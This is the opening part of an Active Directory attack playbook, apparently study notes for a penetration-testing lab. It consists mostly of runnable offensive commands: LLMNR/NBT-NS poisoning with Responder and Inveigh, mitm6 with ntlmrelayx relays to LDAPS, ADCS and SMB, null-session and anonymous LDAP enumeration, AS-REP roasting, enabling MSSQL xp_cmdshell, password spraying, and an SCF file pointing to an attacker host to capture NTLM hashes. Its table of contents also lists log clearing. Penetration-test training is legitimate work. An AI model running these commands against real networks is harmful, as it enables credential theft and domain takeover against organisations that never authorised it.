# m3 AD METHODOLOGY — BULLETPROOF ACTIVE DIRECTORY ATTACK PLAYBOOK
## Decision-Tree Based, Iterative, Source-Verified

> Synthesized from `Active Directory Enumeration & Attacks.md` (10,385 lines, 30+ major sections).
> Every technique, every command, every decision point extracted from the source.
> Coverage: External recon → Initial enumeration → Unauthenticated attacks → Credentialed enum → LOLBins → Kerberoast/AS-REP → ACL abuse → DCSync → Bleeding edge → Trusts → Hardening.
> Linux AND Windows attack paths shown where applicable.

---

## TABLE OF CONTENTS

```
PHASE 0   — Pre-Engagement, Tools, Engagement Types
PHASE 1   — External Reconnaissance (Passive OSINT, ASN, DNS, Names)
PHASE 2   — Initial Internal Enumeration (Network + Host + Service)
PHASE 3   — Unauthenticated Attacks (NO credentials required)
            3.1  LLMNR/NBT-NS Poisoning (Linux: Responder | Windows: Inveigh)
            3.2  IPv6 Takeover (mitm6 + ntlmrelayx)
            3.3  SMB NULL Sessions (rpcclient, enum4linux, CME)
            3.4  LDAP Anonymous Bind (ldapsearch, windapsearch)
            3.5  AS-REP Roasting — unauthenticated (GetNPUsers.py)
            3.6  RDP, WinRM, MSSQL, VNC, SSH — open services
PHASE 4   — Building Target User Lists
PHASE 5   — Password Policy Enumeration
PHASE 6   — Password Spraying
PHASE 7   — Credentialed Enumeration (Linux: CME, rpcclient, BloodHound.py, Impacket, ldapsearch, windapsearch, secretsdump, smbmap)
PHASE 8   — Credentialed Enumeration (Windows: AD Module, PowerView, SharpView, ADExplorer, BloodHound/SharpHound, Snaffler)
PHASE 9   — Living Off the Land (LOLBins, PowerShell downgrade, WMI, dsquery, built-ins)
PHASE 10  — Kerberoasting (Linux + Windows)
PHASE 11  — AS-REP Roasting (Authenticated) + Kerbrute
PHASE 12  — Credential Theft
            12.1  LAPS, LSA Secrets, SAM/SYSTEM
            12.2  GPP / SYSVOL cpassword
            12.3  Description field passwords
            12.4  Autologon credentials (Registry)
            12.5  Wi-Fi passwords (netsh)
            12.6  Browser credentials (SharpChrome, SharpDPAPI, mimikatz dpapi)
            12.7  KeePass databases
            12.8  Putty saved sessions
            12.9  Scheduled tasks / scripts
            12.10 Email + mssql creds
            12.11 LDAP creds sniffing (LDAPRelayScan, NTLM coerce)
            12.12 ADCS / Certificate theft (Certify, Certipy, ESC1-ESC8)
            12.13 Secretsdump (NTDS.dit, SAM, LSA)
PHASE 13  — Privileged Access / Lateral Movement
            13.1  RDP + RestrictedAdmin + Pass-the-Hash RDP
            13.2  WinRM / PSRemoting (evil-winrm, Enter-PSSession, PtH)
            13.3  MSSQL Admin Abuse (mssqlclient, xp_cmdshell, linked servers)
            13.4  SSH from Windows (chisel, plink, openssh)
            13.5  Local Admin Reuse (CME spray)
PHASE 14  — ACL Abuse (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMember, AllExtendedRights, GPO abuse, Targeted Kerberoast, Shadow Credentials, DCSync rights)
PHASE 15  — Domain Dominance
            15.1  DCSync (secretsdump, mimikatz, Invoke-DCSync)
            15.2  Golden Ticket (krbtgt)
            15.3  Silver Ticket (service account)
            15.4  Skeleton Key (mimikatz misc::skeleton)
PHASE 16  — Bleeding Edge Vulnerabilities
            16.1  NoPac (CVE-2021-42278 + CVE-2021-42287)
            16.2  PrintNightmare (CVE-2021-34527 + CVE-2021-1675)
            16.3  PetitPotam (CVE-2021-36942) + ADCS NTLM relay (ESC8)
            16.4  HiveNightmare/SeriousSAM (CVE-2021-36934)
            16.5  ZeroLogon (CVE-2020-1472)
            16.6  MS14-068 (PyKEK)
            16.7  Relaying NTLM to LDAP/LDAPS
            16.8  ADCS ESC1-ESC8
            16.9  PrintSpoofer, GodPotato, SharpEfsPotato (service account → SYSTEM)
            16.10 Shadow Credentials (Whisker, pyWhisker)
            16.11 Certifried (CVE-2022-26923)
PHASE 17  — Misc Misconfigurations
            17.1  Exchange-related privileges (PrivExchange, push subscription)
            17.2  Printer Bug (MS-RPRN) → coerce auth
            17.3  MS14-068
            17.4  DNS Admins (DllHijacking → DC compromise)
            17.5  Group Policy Preferences (GPP cpassword)
            17.6  Audit/Logon scripts via GPO (SharpGPOAbuse)
            17.7  MSSQL abuse (linked servers, UNC path injection, NTLM coerce)
            17.8  Certificates (ESC1, ESC2, ESC3, ESC4, ESC6, ESC9, ESC10, ESC11, ESC13, ESC14, ESC15)
            17.9  adidnsdump (DNS records enum)
            17.10 Constrained/Resource-based constrained delegation abuse
            17.11 LAPS not in use (readable by all)
            17.12 IPv6 takeover over mitm6 + relay
            17.13 WebClient service abuse
            17.14 RBCD (Resource-Based Constrained Delegation) coercion chains
PHASE 18  — Domain Trusts
            18.1  Trust Enumeration (nltest, Get-ADTrust, PowerView, ldapsearch)
            18.2  Trust Direction & Type (Parent-Child, Tree-Root, External, Forest, MIT)
            18.3  Trust Key extraction (Mimikatz lsadump::trust, secretsdump)
            18.4  Child → Parent Privilege Escalation
                  18.4.1  SID History injection (ExtraSids) — Windows + Linux (raiseChild.py)
                  18.4.2  krbtgt hash from child via DCSync with ExtraSids ACL
                  18.4.3  Golden Ticket forged with Enterprise Admins SID
            18.5  Cross-Forest Trust Abuse
                  18.5.1  Trust key → forge inter-realm TGT (kekeo / Rubeus)
                  18.5.2  Cross-forest Kerberoasting (GetUserSPNs.py -target)
                  18.5.3  Foreign group members (Find-ForeignGroup, Get-DomainForeignGroupMember)
                  18.5.4  SID filtering / quarantine / selective auth
                  18.5.5  ATT&CK T1487, T1558.003
            18.6  Trust Transitivity & TreatAsExternal
            18.7  Detection: 4672, 4769, 4781, 4738, 16655
PHASE 19  — Cleanup & OPSEC
            19.1  Restore modified objects (ACL, GPO, SPN)
            19.2  Disable created accounts
            19.3  Clear logs (wevtutil, Invoke-Phant0m)
            19.4  Remove staged payloads
            19.5  Reset changed passwords if instructed
PHASE 20  — Hardening Recommendations & Reporting
            20.1  MITRE ATT&CK Coverage
            20.2  Detection Evasion Hygiene
            20.3  Auditing Tools (PingCastle, BloodHound, Group3r, ADRecon, ADExplorer)
            20.4  Hardening Checklist
            20.5  Exam-Style Skills Assessment Notes
APPENDIX A — Tool Quick Reference
APPENDIX B — Hashcat Mode Table
APPENDIX C — Common Event IDs
APPENDIX D — Common RIDs / SIDs
APPENDIX E — Critical Ports & Services
APPENDIX F — nmap Port-Scan Profiles
APPENDIX G — Common SPN Service Classes
APPENDIX H — Default & Common AD Passwords
APPENDIX I — One-Liner Collection Catalog
```

---

## QUICK REFERENCE — TOP-LEVEL DECISION TREE

```
START: External IP / Internal host
│
├── Have a foothold on a Windows/Linux host in the AD network?
│   ├── NO  → PHASE 1 (External OSINT) + PHASE 2 (Network/Host/Port discovery)
│   └── YES → Continue
│
├── Have valid domain credentials (cleartext/NTLM hash/SYSTEM on domain-joined host)?
│   ├── NO  → PHASE 3 (Unauth attacks: LLMNR/mitm6/SMB NULL/LDAP anon/AS-REP/open services)
│   └── YES → Continue
│
├── Have ONE valid credential?
│   ├── NO  → PHASE 4 + 5 + 6 (build user list, password spray)
│   └── YES → Continue
│
├── Need more credentials OR a privileged account?
│   ├── YES → PHASE 7-12 (credentialed enum → kerberoast → AS-REP → credential theft → ACL abuse)
│   └── NO  → Continue
│
├── Need DA / Enterprise Admin / DCSync rights?
│   ├── YES → PHASE 13 (lateral movement) → PHASE 14 (ACL abuse) → PHASE 15 (DCSync) → PHASE 16-17 (bleeding edge)
│   └── NO  → Continue
│
├── Multiple forests/domains in scope?
│   ├── YES → PHASE 18 (Trusts)
│   └── NO  → Continue
│
└── Engagement ending?
    └── PHASE 19 (cleanup) → PHASE 20 (hardening report)
```

---

# PHASE 0: PRE-ENGAGEMENT, TOOLS, ENGAGEMENT TYPES

## 0.1 - Engagement Type (CRITICAL — drives every subsequent decision)

```
Two engagement archetypes from the source module:

A) TIME-BOXED, NON-STEALTH INTERNAL ASSESSMENT (most common in CPTS-style labs)
   - Goal: Find as many AD misconfigurations & vulns as possible within the timebox
   - Tools welcome: noisy scanners allowed
   - Chain attacks aggressively (spray → kerberoast → ACL → DCSync)
   - Cleanup NOT required (lab environment)

B) REAL-WORLD RED-TEAM (opposite end)
   - OPSEC critical: think about 4625/4624/4662/4672/4738/4769 events per command
   - May avoid spraying entirely (use AS-REP/credential theft instead)
   - Mimikatz is loud — prefer Rubeus or impacket-ticketer
   - AV/EDR-aware tooling only
   - Cleanup REQUIRED (Phase 19)
```

## 0.2 - Tools of the Trade (Source-Verified Inventory)

```
LINUX (Attacker Host):
├── Discovery       nmap, CrackMapExec (netexec), rustscan, fping
├── DNS             dig, nslookup, dnsenum, adidnsdump, dnscat2
├── Web             curl, ffuf, gobuster, feroxbuster
├── OSINT           linkedin2username, Recon-ng, theHarvester, GitHub dorks
├── Username enum   kerbrute, crackmapexec --users, enum4linux(-ng), rpcclient enumdomusers
├── AS-REP Roast    impacket-GetNPUsers
├── Kerberoast      impacket-GetUserSPNs, kerbrute
├── Relay           responder, ntlmrelayx, mitm6
├── LLMNR Poison    responder (-wrf)
├── Credentials     impacket-secretsdump, impacket-psexec, impacket-wmiexec, evil-winrm
├── BloodHound      bloodhound-python, neo4j
├── AD enum         ldapsearch, windapsearch, crackmapexec, rpcclient, smbclient
├── Shares          smbmap, smbclient, crackmapexec --shares, cme -M spider_plus
├── Database        mssqlclient.py (impacket)
├── Bleeding edge   noPac.py, CVE-2021-1675.py, mimikatz via impacket, PetitPotam.py
├── Trust           raiseChild.py, impacket-ticketer, mimikatz lsadump::trust
└── Hash cracking   hashcat (modes 13100/19700/18200/5600/1000), john

WINDOWS (Attacker / Victim):
├── Enumeration     ActiveDirectory module (built-in), PowerView, SharpView
├── Kerberoast      Rubeus (kerberoast), PowerView (Get-DomainUser -SPN)
├── AS-REP Roast    Rubeus (asreproast), PowerView (Get-DomainUser DONT_REQ_PREAUTH)
├── LLMNR Poison    Inveigh, InveighZero, Responder (responder.exe)
├── Coercion        PetitPotam, SpoolSample, Printerbug, DFSCoerce, ShadowCoerce
├── Credential      mimikatz, Rubeus, SharpChrome, SharpDPAPI, SharpKeePass, Lazagne
├── Lateral         psexec, wmiexec, smbexec, atexec, evil-winrm, msf modules
├── BloodHound      SharpHound.exe, AzureHound
├── ADCS            Certify.exe, Certipy, PSPKIAudit
├── Bleeding edge   mimikatz, SharpEfsPotato, PrintSpoofer, Whisker
├── LOLBins         PowerShell, wmic, reg, dsquery, net, sc, nltest, findstr, find
├── Trust abuse     Rubeus, mimikatz, PowerView, kekeo (legacy)
└── Files/Transfers  smbclient.py, smbserver.py, certutil, bitsadmin
```

## 0.3 - Engagement Prep

```bash
# 1. Workspace
mkdir -p ~/AD/{recon,enum,spray,kerb,loot,exfil,loot/screenshots}
cd ~/AD

# 2. Live host list (keep updated as new hosts found)
echo "172.16.5.5   DC01.INLANEFREIGHT.LOCAL" >> hosts.txt

# 3. Wordlists (canonical from source)
ln -s /usr/share/seclists/Usernames/Names/names.txt ./names.txt
ln -s /usr/share/seclists/Passwords/Common-Credentials/best1050.txt ./best1050.txt
ln -s /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ./rockyou.txt
# Statistically-likely usernames
ln -s /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-usersfabianfabian.txt ./jsmith.txt
# /usr/share/seclists/Usernames contains jsmith.txt, jsmith1.txt, jsmith2.txt
```

---

# PHASE 1: EXTERNAL RECONNAISSANCE (PASSIVE OSINT)

> Goal: Build a target list (users, subdomains, IP ranges) BEFORE the engagement starts, with zero touches to client infra.

## 1.1 - Build Target List (no engagement tools)

```
Sources (combine all):
  - ASN / IP ranges (bgp.he.net, Hurricane Electric)
  - Domain WHOIS (registrar, creation, contacts)
  - Subdomains (subfinder, chaos, assetfinder, sublist3r, crt.sh)
  - Live hosts (httpx)
  - Public data (theHarvester, Hunter.io, LinkedIn)
  - GitHub/GitLab dorks (org names, internal repo leakage)
  - Google dorks (filetype:pdf,site:target.com, etc.)
  - Breach data (Dehashed, HudsonRock, HIBP, intelX)
  - Mail exchanger / SPF / DMARC
  - Shodan, Censys, BinaryEdge
```

### Linux one-liners
```bash
# ASN lookup
whois -h whois.radb.net -- '-i origin AS<ASN>' | grep -Eo "([0-9.]+){4}/[0-9]+"

# Subdomain enum
subfinder -d target.com -o subs.txt
assetfinder --subs-only target.com >> subs.txt
chaos -d target.com -key $CHAOS_KEY -o subs.txt
cat subs.txt | sort -u > subs_unique.txt

# Live hosts
cat subs_unique.txt | httpx -status-code -title -tech-detect -o live.txt
cat live.txt | awk '{print $1}' > urls.txt

# Emails / names
theHarvester -d target.com -b all -f harvester_output.xml
python3 linkedin2username.py -c "Target Corp" -d target.com -e 1w

# Wordlist from subdomains
cat subs_unique.txt | wfuzz -u http://FUZZ.target.com -w /dev/null --hl 0
```

### Windows (PowerView)
```powershell
# Public IP resolution
Get-DomainIPAddress  # Only works for AD DNS records, not external
```

## 1.2 - Decision Points

```
Do you have:
├── An external pivot / VPN / phishing pretext?
│   └── Phase 3-5 directly
├── ONLY public information?
│   └── Build target list, hand off to internal phase
└── Client-provided AD scope?
    └── Skip external, jump to Phase 2
```

---

# PHASE 2: INITIAL INTERNAL ENUMERATION (Network + Host + Service)

> Touches client infrastructure. Decision: passive (sniff) or active (scan)?

## 2.1 - Network Discovery (touch the wire, but do not authenticate)

```bash
# Passive: Wireshark / tcpdump on a span port or while waiting
sudo tcpdump -i eth0 -nn -v
# Look for: ARP, mDNS (5353), LLMNR (5355), NBNS (137), Kerberos (88), DNS (53), LDAP (389/636), SMB (445), RDP (3389), WinRM (5985/5986)

# Responder analysis mode (no poisoning)
sudo responder -I eth0 -A
# -A = analyze only, no poisoning. Reports:
#   - LLMNR/NBNS queries
#   - MDNS queries
#   - DHCP/ICMPv6 requests
#   - HTTP NTLM auth (WPAD, Proxy-Not-Found)
#   - HTTPS NTLM auth
#   - SMB NTLM auth (file:// links in browser)
#   - Outlook/Office auth
#   - SQL Server
#   - LDAP auth (any host)
#   - FTP, IMAP, POP3
#   - DNS queries

# ICMP sweep (no auth)
fping -asgq 172.16.5.0/23
# or
nmap -sn 172.16.5.0/23

# If host discovery disabled, try ARP via netdiscover
sudo netdiscover -i eth0 -r 172.16.5.0/23
```

## 2.2 - Host Port Scan (targeted)

```bash
# Top 1000 (default)
sudo nmap -sC -sV -v -oA scans/nmap_tcp 172.16.5.0/23

# Top 100 (faster)
sudo nmap -sC -sV -v -F --open -oA scans/nmap_top100 172.16.5.0/23

# Full TCP
sudo nmap -sC -sV -v -p- --open -oA scans/nmap_full 172.16.5.0/23

# UDP (slow, but discovers DNS, SNMP, L2TP, IKE, TFTP)
sudo nmap -sU -sC -sV -v --top-ports 50 -oA scans/nmap_udp 172.16.5.0/23

# Vulnerability scan (loud — only in non-stealth)
nmap -sC -sV -v --script=vuln -oA scans/nmap_vuln <target>
```

## 2.3 - DC Identification (CRITICAL — drives every auth-based attack)

```bash
# Port-based: 88 (Kerberos) up + 389 (LDAP) up = likely DC
nmap -p 88,389,636,3268,3269,53,135,139,445,3389,5985,5986 <host>
# DC ports (always-on for AD):
#   53   DNS
#   88   Kerberos
#   135  RPC
#   139  NetBIOS
#   389  LDAP
#   445  SMB
#   464  Kerberos password change
#   593  HTTP RPC Ep Map
#   636  LDAPS
#   3268 Global Catalog
#   3269 Global Catalog SSL
#   5722 File Replication
#   9389 AD Web Services
#   49152-65535 Dynamic RPC

# DNS-based: srv record query
dig -t SRV _kerberos._tcp.inlanefreight.local @172.16.5.5
dig -t SRV _ldap._tcp.dc._msdcs.inlanefreight.local @172.16.5.5

# nslookup
nslookup -type=SRV _ldap._tcp.dc._msdcs.inlanefreight.local 172.16.5.5

# enum4linux-ng (auth-less, looks at SMB + RPC)
enum4linux-ng -A 172.16.5.5
# Output: domain name, DC name, OS, SMB shares, password policy, users, groups
```

## 2.4 - Decision Tree — Initial Scan

```
Scan shows:
├── DC + member servers + workstations
│   ├── DC open:88 → Phase 3 (AS-REP Roast, Kerbrute enum)
│   ├── DC open:389 → Phase 3 (LDAP anon)
│   ├── DC open:445 → Phase 3 (SMB NULL, CME spray)
│   ├── SMB signing: false on any host → NTLM relay possible (Phase 3.2)
│   ├── LLMNR/NBNS active (responder -A shows traffic) → Phase 3.1
│   ├── IPv6 active → Phase 3.2 (mitm6)
│   ├── Web server:80/443 → ADCS templates? ESC1-ESC8?
│   ├── Web server → check for WordPress, Exchange, IIS, etc.
│   └── SQL on 1433 → mssqlclient.py guest auth
├── Only Linux hosts visible
│   ├── NFS (2049) → mount + UID mapping
│   ├── SSH (22) → creds from spray
│   ├── SMTP (25) → user enum via RCPT/VRFY
│   └── Web (80/443) → app vulnerabilities
└── No infrastructure visible
    └── Re-run scan, check VLAN segmentation
```

## 2.5 - First-Pass Host Categorization

```bash
# 1. Identify DCs (have 88, 389 open)
# 2. Identify file servers (445 + lots of shares)
# 3. Identify Exchange (25, 465, 587, 2525, 80, 443 OWA)
# 4. Identify ADCS (80, 443 + /certsrv, CA in description)
# 5. Identify MSSQL (1433, 1434, 2433)
# 6. Identify workstations (only 135, 139, 445, 3389, 5985 typically)
```

---

# PHASE 3: UNAUTHENTICATED ATTACKS (NO credentials required)

## 3.1 - LLMNR / NBT-NS Poisoning

> **Trigger:** `responder -A` shows the network is making LLMNR (5355) or NBNS (137) queries. Often seen when users mistype hostnames, browse to non-existent UNC paths, etc.

### Decision Tree
```
LLMNR/NBNS active?
├── YES → Run Responder/Inveigh to capture NetNTLMv2 hashes
│   ├── Got hash → Crack with hashcat -m 5600
│   ├── Got hash + SMB signing disabled on ANY host → Try ntlmrelayx
│   └── Got hash + cracking failed → Move to other attacks
├── NO  → Move to AS-REP Roast / SMB NULL / LDAP anon
└── All Windows hosts have SMB signing enforced → Cracking only, no relay
```

### 3.1.1 - Linux — Responder

```bash
# Start (in tmux so it doesn't die)
sudo tmux new -s responder
sudo responder -I eth0 -wrf
# -w = WPAD
# -r = NetBIOS wredir (redirector)
# -f = fingerprint (extra fingerprints in HTTP/SMB)
# Other useful: -F (force NTLM/basic auth on captured), -P (passive), -v (verbose)

# Default Responder config
cat /etc/responder/Responder.conf
# Notable flags: SQL, SMB, RDP, Kerberos, FTP, IMAP, POP3, SMTP, DNS, HTTP, HTTPS, LDAP, LDAP_RPC, MQTT
# We generally disable SMB and HTTP in Responder.conf to enable ntlmrelayx relay targets

# Log file location
ls /usr/share/responder/logs/
# Format: <Proto>-NTLMv2-SSP-<IP>.txt
# Example: SMB-NTLMv2-SSP-172.16.5.25.txt

# Cracking
hashcat -m 5600 hashes/SMB-NTLMv2-SSP-172.16.5.25.txt /usr/share/wordlists/rockyou.txt
```

### 3.1.2 - Windows — Inveigh / InveighZero

```powershell
# Inveigh.ps1 (PowerShell)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y -InvRelayCheck Y -SMBRelayCheck Y
# Detailed help
Get-Help Invoke-Inveigh -Full

# Inveigh.exe (C# / .NET — preferred, less PowerShell noise)
.\Inveigh.exe
# Press ESC to enter interactive console
# Commands in console:
#   GET NTLMV2UNIQUE
#   GET NTLMV2USERNAMES
#   GET NTLMV2RELAY
#   GET INVEIGH
#   SET INVEIGH/RELOAD

# InveighZero (CoBetterPhils version — does Kerberos relay, IPv6)
.\InveighZero.exe
```

### 3.1.3 - SCF File Attack (File Server NTLMv2 capture, no LLMNR)

```bash
# 1. Create SCF file on writable SMB share
# (\\<server>\<share>\<file>.scf)
# Contents (icon points to our Responder):
cat > @test.scf << EOF
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\test.ico
[Taskbar]
Command=ToggleDesktop
EOF

# 2. Responder logs the NTLMv2 from any user who views the share
# (e.g., a script enumerating shares, or admin opening the directory)
```

### 3.1.4 - NTLMv2 Hash → Cracking Considerations

```
Hashcat -m 5600 with rockyou.txt
Considerations:
- Each NetNTLMv2 has format: user::DOMAIN:challenge:NTLMv2SSP:NTProofStr:fullhash
- Use -O for optimized kernels
- Try rockyou.txt, then best1050, then username permutations
- /usr/share/hashcat/rules/best64.rule helps
```

## 3.2 - IPv6 Takeover (mitm6 + ntlmrelayx)

> **Trigger:** Windows prefers IPv6; many networks don't have DHCPv6. mitm6 advertises itself as the IPv6 DNS server. When a host queries DNS, mitm6 replies. This triggers WPAD lookup → HTTP NTLM auth → relay.

### Decision Tree
```
SMB signing enforced on ALL targets?
├── YES → mitm6 → LDAPS relay (delegation attack) or ADCS ESC8
└── NO  → mitm6 → SMB relay (drop payload on target)

Target has ADCS web enrollment (certsrv)?
├── YES → ESC8 NTLM relay → certificate for any user → auth as that user
└── NO  → LDAPS relay with --delegate-access (RBCD attack)
```

### Commands
```bash
# Terminal 1: mitm6
sudo mitm6 -d inlanefreight.local -i eth0
# Use -d to limit to specific domain (less noisy)

# Terminal 2a: LDAPS relay (delegate access / RBCD)
sudo ntlmrelayx.py -6 -t ldaps://172.16.5.5 -wh fakewpad.inlanefreight.local --delegate-access --no-smb-server
# On success: machine account FAKE$ created with RBCD on target

# Terminal 2b: ADCS relay (ESC8)
sudo ntlmrelayx.py -6 -t http://172.16.5.45/certsrv/certfnsh.asp -wh fakewpad.inlanefreight.local --adcs --template DomainController
# On success: cert for DC machine account → auth as DC$ → DCSync

# Terminal 2c: SMB relay
sudo ntlmrelayx.py -6 -tf smb_targets.txt -wh fakewpad.inlanefreight.local -smb2support --no-http-server
# Targets: file servers with signing:False
```

## 3.3 - SMB NULL Sessions

> **Trigger:** Old/legacy systems, poorly configured, anonymous bind allowed.

### Linux
```bash
# rpcclient
rpcclient -U '' -N 172.16.5.5
rpcclient $> enumdomusers
rpcclient $> querydominfo
rpcclient $> getdompwinfo
rpcclient $> querydispinfo
rpcclient $> enumdomgroups
rpcclient $> querygroup 0x200
rpcclient $> querygroupmem 0x200

# Pull full user list
rpcclient -U '' -N 172.16.5.5 -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' > users.txt

# enum4linux (legacy)
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
enum4linux -P 172.16.5.5
enum4linux -G 172.16.5.5
enum4linux -S 172.16.5.5
enum4linux -a 172.16.5.5

# enum4linux-ng (Python rewrite, better)
enum4linux-ng -P 172.16.5.5 -oA enum_passpol
enum4linux-ng -U 172.16.5.5 -oA enum_users
enum4linux-ng -A 172.16.5.5 -oA enum_all

# CME
netexec smb 172.16.5.5 --shares -u '' -p ''
netexec smb 172.16.5.5 --users -u '' -p ''
netexec smb 172.16.5.5 --groups -u '' -p ''
netexec smb 172.16.5.5 --pass-pol -u '' -p ''
netexec smb 172.16.5.5 --rid-brute -u '' -p ''
# Output: RIDs 500, 501, 502, 1000, 1101, etc. with user names
```

### Windows
```powershell
# Net (legacy)
net use \\172.16.5.5\ipc$ "" /u:""
net view \\172.16.5.5

# PowerView (auth-less for some)
Get-DomainUser -Domain inlanefreight.local  # needs some context
```

### Decision Tree
```
NULL session works?
├── YES → User list, password policy, group list, shares
│   ├── Got many users → Phase 5 (Password Spray)
│   └── Got password policy → Phase 5
├── NO  → LDAP anon or Phase 4 (Kerbrute enum)
└── Restricted (only some info) → Combine with other methods
```

## 3.4 - LDAP Anonymous Bind

> **Trigger:** DC allows anonymous LDAP bind (`LDAPAnonymousBinding` not disabled via `Network access: Allow anonymous SID/name translation`).

### Linux
```bash
# ldapsearch — pull all user sAMAccountNames
ldapsearch -h 172.16.5.5 -x -b "DC=inlanefreight,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName

# Pull password policy attributes
ldapsearch -h 172.16.5.5 -x -b "DC=inlanefreight,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# Pull all
ldapsearch -h 172.16.5.5 -x -b "DC=inlanefreight,DC=local" -s sub "(objectclass=*)" > all_ldap.txt

# windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U  # users
./windapsearch.py --dc-ip 172.16.5.5 -u "" -PU # privileged users
./windapsearch.py --dc-ip 172.16.5.5 -u "" -G  # groups
./windapsearch.py --dc-ip 172.16.5.5 -u "" -m  # machines
./windapsearch.py --dc-ip 172.16.5.5 -u "" -s  # subnets

# CME
netexec ldap 172.16.5.5 -u '' -p '' --users
netexec ldap 172.16.5.5 -u '' -p '' --groups
```

### Windows
```powershell
# ActiveDirectory module
Get-ADUser -Filter * -SearchBase "DC=inlanefreight,DC=local"  # might fail anon
# ADExplorer (Sysinternals) → connect anonymously to LDAP

# PowerView (some queries work without creds)
Get-DomainUser -LDAPFilter (objectclass=user) -Domain inlanefreight.local
```

## 3.5 - AS-REP Roasting — Unauthenticated

> **Trigger:** Any user has `DONT_REQ_PREAUTH` flag set (UF_DONT_REQUIRE_PREAUTH = 0x400000 = 4194304). Rare in modern AD; often on test accounts, service accounts, or admin mistakes.

### Linux — FindNPUsers
```bash
# Get AS-REP roastable users (no creds, query LDAP for DONT_REQ_PREAUTH)
impacket-GetNPUsers -dc-ip 172.16.5.5 -request -format hashcat inlanefreight.local/ -usersfile users.txt -outputfile asrep.hash
# -usersfile speeds it up; without it, queries all
# AS-REP hash format: $krb5asrep$23$user@domain:hash...

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Windows — Rubeus
```cmd
# Find via LDAP
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# /nowrap: no line wrap in base64

# Crack on Linux
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Or use PowerView to find
Get-DomainUser -PreauthNotRequired -Properties samaccountname,useraccountcontrol | select samaccountname,useraccountcontrol
```

### Decision Tree
```
AS-REP roastable users found?
├── YES → Crack
│   ├── Cracked → Use creds for Phase 7 (credentialed enum)
│   └── Not cracked → Try more wordlists, pattern generation
└── NO  → Move on (other attacks)
```

## 3.6 - Open Service Abuse

```
Service:Port — Auth Method:
├── MSSQL:1433  — sa / guest with no pass
│   mssqlclient.py inlanefreight.local/guest@172.16.5.5 -windows-auth
│   mssqlclient.py sa:'<guess>'@172.16.5.5
├── RDP:3389    — guest, default creds
│   xfreerdp /u:guest /p:"" /v:172.16.5.5
├── WinRM:5985  — fallback creds
│   evil-winrm -i 172.16.5.5 -u guest -p ""
├── SSH:22      — Linux host keys, password guess
│   ssh guest@172.16.5.5
├── FTP:21      — anonymous, guest
│   ftp 172.16.5.5  → anonymous:anonymous
├── VNC:5900+   — no password or default
│   vncviewer 172.16.5.5
├── SNMP:161    — community string
│   onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 172.16.5.5
│   snmpbulkwalk -v2c -c public 172.16.5.5 NET-SNMP-EXTEND-MIB::nsExtendObjects
└── WinRM HTTPS:5986 — same as 5985 but with cert
```

### MSSQL with mssqlclient (Lateral Movement entry)
```bash
# Windows auth (domain-creds)
mssqlclient.py inlanefreight.local/username:'Welcome1'@172.16.5.5 -windows-auth
# After login:
SQL> EXEC sp_xp_cmdshell 'whoami'
# If xp_cmdshell disabled:
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC sp_xp_cmdshell 'whoami'
# Impersonation check (if sysadmin)
SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
# If you can impersonate sa, then:
SQL> EXECUTE AS LOGIN = 'sa'; EXEC sp_xp_cmdshell 'whoami'
```

---

# PHASE 4: BUILDING TARGET USER LISTS

> **Goal:** Maximize coverage for password spray. Combine all sources.

## Source Hierarchy (most to least coverage)
```
1. Credentialed enum (CME --users / Get-DomainUser / BloodHound) — 100% coverage
2. LDAP anonymous bind
3. SMB NULL session
4. Kerbrute userenum
5. linkedin2username (LinkedIn)
6. Dehashed / HIBP breach data
7. Statistically-likely usernames (jsmith.txt)
```

## Combine & Dedupe
```bash
cat users_ldap.txt users_null.txt users_kerbrute.txt users_linkedin.txt | sort -u > users_final.txt
# Format: user (no @domain)
# Kerbrute input format: domain\user or just user
```

## Format Conversion
```bash
# kerbrute wants: domain\user or user (with -d)
# DomainPasswordSpray wants: samaccountname (no @, no \)
# rpcclient wants: user
# CrackMapExec: user (with -d domain) or DOMAIN\user

# Quick conversion
sed 's/INLANEFREIGHT\\//' users_with_domain.txt > users_clean.txt
```

---

# PHASE 5: PASSWORD POLICY ENUMERATION

## Without Creds
```bash
# rpcclient NULL
rpcclient -U '' -N 172.16.5.5 -c 'getdompwinfo'
# Output: min_password_length, password_properties, history_length, max_password_age, lockout_threshold, lockout_duration

# enum4linux
enum4linux -P 172.16.5.5

# LDAP anonymous
ldapsearch -h 172.16.5.5 -x -b "DC=inlanefreight,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# CME
netexec smb 172.16.5.5 -u '' -p '' --pass-pol
```

## With Creds
```bash
# Linux
netexec smb 172.16.5.5 -u user -p 'pass' --pass-pol
# Windows
net accounts
# PowerShell
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
```

## Key Fields
```
- minPwdLength (e.g., 8) — minimum password length
- pwdProperties (1 = complexity, 0 = no complexity)
- pwdHistoryLength (e.g., 24) — can't reuse last N
- maxPwdAge (e.g., 42 days) — must change
- minPwdAge (e.g., 1 day) — can't change too soon
- lockoutThreshold (e.g., 5) — failures before lock
- lockoutDuration (e.g., 30 min) — lock duration
- lockoutObservationWindow (e.g., 30 min) — observation window
```

---

# PHASE 6: PASSWORD SPRAYING

> **Decision: Do you have the lockout policy?**
```
├── YES  → Spray (threshold - 1) per account, wait (lockout_duration + 5) between sprays
├── NO   → 1 spray, then 1-hour wait
└── NOT ENFORCED → Aggressive spraying fine
```

